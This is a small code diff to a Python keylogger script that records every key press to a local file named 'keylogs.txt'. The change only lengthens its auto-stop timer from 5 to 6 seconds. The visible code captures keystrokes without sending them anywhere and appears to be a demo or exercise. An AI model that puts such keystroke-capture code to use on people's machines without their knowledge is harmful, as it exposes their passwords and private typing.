@@ -10,7 +10,7 @@ logging.basicConfig(filename=("keylogs.txt"),filemode="w",
 def on_press(key):
     logging.info(str(key))
 with Listener(on_press=on_press) as listener:
-    Timer(5, listener.stop).start()
+    Timer(6, listener.stop).start()
     listener.join()
 
 
